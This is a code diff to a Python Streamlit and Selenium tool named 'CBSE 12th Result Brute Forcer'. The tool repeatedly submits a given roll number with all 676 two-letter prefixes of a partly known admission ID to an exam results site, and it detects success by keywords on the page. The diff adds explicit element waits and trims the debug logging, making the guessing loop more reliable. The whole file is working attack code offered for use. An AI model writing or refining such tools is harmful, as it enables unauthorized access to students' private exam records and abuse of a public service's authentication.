@@ -1,6 +1,8 @@
 import streamlit as st
 from selenium import webdriver
 from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException
 import time
 import string
@@ -17,43 +19,29 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    debug_info = {"error_text": "", "has_result_keywords": False, "page_length": 0}
-    
     try:
-        # Check error message
         try:
             error_elem = driver.find_element(By.ID, "err_msg")
-            if error_elem.is_displayed():
-                debug_info["error_text"] = error_elem.text.strip()
-                if debug_info["error_text"]:
-                    return False, debug_info
+            if error_elem.is_displayed() and error_elem.text.strip():
+                return False
         except NoSuchElementException:
-            debug_info["error_text"] = "No err_msg element"
-        except:
-            debug_info["error_text"] = "Error finding err_msg"
-
-        # Success checks
-        page_text = driver.page_source.lower()
-        debug_info["page_length"] = len(driver.page_source)
+            pass
         
         success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
-        debug_info["has_result_keywords"] = any(ind in page_text for ind in success_indicators)
-
-        if debug_info["has_result_keywords"]:
-            return True, debug_info
-
+        page_text = driver.page_source.lower()
+        if any(ind in page_text for ind in success_indicators):
+            return True
+            
         if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
-            return True, debug_info
-
-    except Exception as e:
-        debug_info["error_text"] = f"Exception: {str(e)}"
-    
-    return False, debug_info
+            return True
+    except:
+        pass
+    return False
 
 
 # ====================== UI ======================
 st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer - Debug Mode")
+st.title("🔍 CBSE 12th Result Brute Forcer - Fixed")
 
 roll_number = st.text_input("Roll Number", value="18615900")
 known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
@@ -66,13 +54,19 @@ if st.button("🚀 Start Brute Force", type="primary"):
         status = st.empty()
         progress = st.empty()
         result_box = st.empty()
-        debug_expander = st.expander("🔍 Debug Log (Click to expand)", expanded=True)
+        debug = st.expander("Debug Log", expanded=True)
 
         driver = None
         try:
             driver = get_driver()
             driver.get(URL)
-            status.success("✅ Page loaded. Starting brute force...")
+            
+            # === CRITICAL: Wait for form to load ===
+            wait = WebDriverWait(driver, 20)
+            wait.until(EC.presence_of_element_located((By.ID, "rroll")))
+            time.sleep(2)   # Extra safety
+
+            status.success("✅ Form loaded successfully. Starting brute force...")
 
             letters = string.ascii_uppercase
             count = 0
@@ -86,24 +80,27 @@ if st.button("🚀 Start Brute Force", type="primary"):
                     progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")
 
                     try:
-                        driver.find_element(By.ID, "rroll").clear()
-                        driver.find_element(By.ID, "rroll").send_keys(roll_number)
+                        # Wait + Fill
+                        rroll = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
+                        rroll.clear()
+                        rroll.send_keys(roll_number)
 
-                        driver.find_element(By.ID, "admn_id").clear()
-                        driver.find_element(By.ID, "admn_id").send_keys(code)
+                        admn = wait.until(EC.presence_of_element_located((By.ID, "admn_id")))
+                        admn.clear()
+                        admn.send_keys(code)
 
-                        driver.find_element(By.ID, "submit").click()
+                        # Submit
+                        submit = wait.until(EC.element_to_be_clickable((By.ID, "submit")))
+                        submit.click()
+
                         time.sleep(delay)
 
-                        success, debug_info = is_success(driver)
-
-                        # Log for debugging
-                        log_msg = f"{attempt} | Success: {success} | Error: {debug_info['error_text'][:80]} | Keywords: {debug_info['has_result_keywords']} | Length: {debug_info['page_length']}"
-                        debug_expander.write(log_msg)
+                        success = is_success(driver)
+                        debug.write(f"{attempt} → Success: {success}")
 
                         if success:
                             result_box.success(f"""
-                            🎉 SUCCESS FOUND!
+                            SUCCESS FOUND!
 
                             Full Code: **{code}**
                             Prefix: **{attempt}**
@@ -111,7 +108,7 @@ if st.button("🚀 Start Brute Force", type="primary"):
                             st.balloons()
                             break
                     except Exception as e:
-                        debug_expander.write(f"{attempt} → Exception: {str(e)}")
+                        debug.write(f"{attempt} → Error: {str(e)[:100]}")
                         continue
 
             else:
